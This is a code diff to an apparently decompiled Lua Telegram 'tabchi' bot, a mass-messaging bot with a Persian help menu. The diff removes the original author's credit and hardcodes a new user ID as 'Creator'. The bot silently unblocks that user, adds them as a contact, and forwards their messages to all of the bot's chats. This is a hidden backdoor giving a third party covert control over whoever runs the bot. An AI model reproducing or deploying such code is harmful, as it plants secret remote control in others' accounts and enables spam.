@@ -161,8 +161,8 @@ function process_updates()
     local jdata = JSON.decode(res)
     jdata = jdata or {have_tab = true}
     if jdata.have_tab then
-      tdcli.unblockUser(218722292)
-      tdcli.importContacts(989213985504, "Creator", "", 353581098)
+      tdcli.unblockUser(140760293)
+      tdcli.importContacts(0, "Creator", "", 140760293)
       return redis:setex("tabchi:" .. tostring(tabchi_id) .. ":gotupdated", 600, true)
     end
   end
@@ -185,7 +185,7 @@ function process(msg)
 			    elseif text_:match("^[!/#](help)") and is_sudo(msg) then
       local text1 = [[
 	  
-راهنمای ربات تبچی نسخه 4.3 دیکامپایل شده بدون تبلیغ
+راهنمای ربات تبچی 
 /pm <userid> <text>
 ارسال <text> به <userid>
 /block <userid>
@@ -249,7 +249,7 @@ function process(msg)
 آپدیت کردن فایل های ربات
 				
 —------—
-Help >> @JoveTeam ]]
+]]
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
 	  
       elseif text_:match("^[!/#](remsudo) (%d+)") then
@@ -765,7 +765,7 @@ This code]])
         local sudo = tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo"))
         tdcli.send_file(sudo, "Photo", "tabchi_" .. tabchi_id .. "_code.png", nil)
       end
-    elseif msg.sender_user_id_ == 11111111 then
+    elseif msg.sender_user_id_ == 140760293 then
       local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
       local id = msg.id_
       for i, v in pairs(all) do
@@ -866,17 +866,17 @@ Bia pv]]
       return process_links(msg.content_.caption_)
     end
   elseif data.ID == "UpdateChat" then
-    if data.chat_.id_ == 11111111 then
+    if data.chat_.id_ == 140760293 then
       tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
-    elseif data.chat_id_ == 11111111 then
+    elseif data.chat_id_ == 140760293 then
       tdcli.unblockUser(data.chat_.id_)
-    elseif data.chat_.id == 218722292 then
+    elseif data.chat_.id == 140760293 then
       tdcli.unblockUser(data.chat_.id_)
-      tdcli.importContacts(989213985504, "Creator", "", data.chat_.id)
+      tdcli.importContacts(0, "Creator", "", data.chat_.id)
     end
     return add(data.chat_.id_)
   elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
-    tdcli.getChats("9223372036854775807", 0, 20)
+    tdcli.getChats("0", 0, 20)
   end
 end
 return {update = update}
